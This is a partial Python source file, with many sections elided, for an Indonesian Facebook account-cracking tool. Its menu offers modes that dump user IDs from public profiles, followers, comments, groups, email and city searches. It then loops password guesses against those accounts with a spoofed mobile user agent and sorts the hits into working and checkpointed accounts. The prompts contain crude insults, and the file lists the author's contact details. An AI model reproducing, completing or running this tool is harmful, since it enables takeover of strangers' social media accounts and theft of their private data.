...
def banner():
	ilham = []
	ilham.append(nel(f'''{M2}8888888 888      888    888        d8888 888b     d888      Y88b   d88P 8888888b.  
  888   888      888    888       d88888 8888b   d8888       Y88b d88P  888  "Y88b 
  888   888      888    888      d88P888 88888b.d88888        Y88o88P   888    888 
  888   888      8888888888     d88P 888 888Y88888P888         Y888P    888    888 
  888   888      888    888    d88P  888 888 Y888P 888         d888b    888    888 
  888   888      888    888   d88P   888 888  Y8P  888        d88888b   888    888 
  888   888      888    888  d8888888888 888   "   888       d88P Y88b  888  .d88P 
8888888 88888888 888    888 d88P     888 888       888      d88P   Y88b 8888888P"''', style=f"{B2}"));sol().print(col(ilham))
...
def logo():
 ...
 selamat datang {hh}user{P}, script by {hh}Ilham Syaputra {P} version pribadi""")
...
def login():
	...
	clear_layar()
	banner()
	cetak(nel(f"{X}[+] MASUKKAN COOKIE BARU • DILARANG MENGGUNAKAN AKUN PRIBADI ANDA",style=f"{B2}"))
...
def menu(n,t,c):
	clear_layar()
	os.system("xdg-open https://www.facebook.com/profile.php?id=100082802220903")
	open(".cookie.txt","r").read()
	open(".token.txt","r").read()
	banner()
	apa = []
	apa.append(nel(f'''[•]AUTHOR   : ILHAM RK
[•]FACEBOOK : https://www.facebook.com/profile.Ilham RK
[•]WHATSAPP : 082180535095'''));sol().print(col(apa))
	api = []
	api.append(nel(f'''[01] CRACK ID PUBLIK              [07] CRACK ID SEARCH
[02] CRACK ID MASSAL              [08] CRACK ID FILE
[03] CRACK ID FOLLOW              [09] CRACK ID SEKOTA
[04] CRACK ID KOMEN               [10] CHECK HASIL RESULT
[05] CRACK ID GRUP                [11] CHECK OPSI AKUN
[06] CRACK ID EMAIL               [12] 𝙻𝙾𝙶𝙾𝚄𝚃 (exit program) '''));sol().print(col(api))
	...
	else:print(f" [{M}>{P}] isi dengan benar");time.sleep(1);back()
...
def cek_opsi_cp():
	...
	exc = input(f' [{kk}<{P}] nomor yang akan di chek\n nomor : ')
	file = nom[int(exc)-1]
	print(' ─────────────────────────────')
	detek.append('file')
...
def cek_hasil():
	no,nom = 0,[]
	one = input(f' [{hh}1{P}] chek hasil akun ok\n [{hh}2{P}] cek hasil akun cp\n menu : ')
	if one in ['1','01']:
		...
		input(f'\n[{hh}<{P}] tekan enter untuk kembali')
		back()
	else:print(f" [{M}>{P}] isi yang benar kontol");time.sleep(2);back()
...
def crack_publik(t,c):
	user = input(f' [{hh}<{P}] pastikan akun bersifat publik kontol\n akun : ')
	...
	try:
		...
		putar_sound('error')
		print(f" [{M}>{P}] akun ini tidak publik kontol");time.sleep(2);back()
	atur_atur()
	
def crack_masal(t,c):
    print(f' [{hh}<{P}] maximal dump [ 10 Target ]')
    try:
        bz=0
        apa = int(input(f'Anda Mau Berapa Target ? : '))
    except:apa=1
    for bz in range(apa):
    	bz +=1
    	if '6' in str(bz):atur_atur()
    	user = input(f'\r Masukan id yang ke {bz} : ')
    	if(re.findall("\w+",user)):akun = convert_id(user)
    	else:akun = user
    	try:
    		...
    		print(f"\r [{kk}!{P}] akun ini tidak publik kontol      ")
    		continue	                       		
    atur_atur()
    
    
def crack_foll(t,c):
	user = input(f' [{hh}<{P}] pastikan akun ini bersifat publik kontol\n akun : ')
	if(re.findall("\w+",user)):akun = convert_id(user)
	else:akun = user
	try:
		...
		print(f" [{M}>{P}] akun ini tidak publik");time.sleep(2);back()
		
def crack_group(c):
	link = input(f' [{hh}<{P}] pastikan group bersifat publik kontol\n id group : ')
...
def get_sekota(t,c):
	...
	target, nom = [], 0
	getid = []
	print(f" [{hh}>{P}] pastikan target ini  bersifat publik kontol")
	akun = input(' target : ')
	try:
	...
	target.clear()
	uru = input(f' silahkan pilih urutan dump\n [{hh}1{P}] dari new \n [{hh}2{P}] dari old\n urutan : ')
	if uru in ['1']:
	...
	for data in target:
		...
		try:
			...
			try:
				...
				print(f' [{M}>{P}] akun ini tidak publik\n [{M}>{P}] nama akun  : {M}{na}{P}\n [{M}>{P}] uid akun   : {M}{id}{P}\n');pass
			...
			print(f"{P} ─────────────────────────────")
			abc = input(f' [{hh}>{P}] silahkan masukan nomor akun kontol\n nomor : ')
			akun = getid[int(abc)-1]
			dump_kota(t,c,akun)
...
def crack(idf,pwx,url,awal):
	...
	for pw in pwx:
		try:
			...
			else:ua = "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
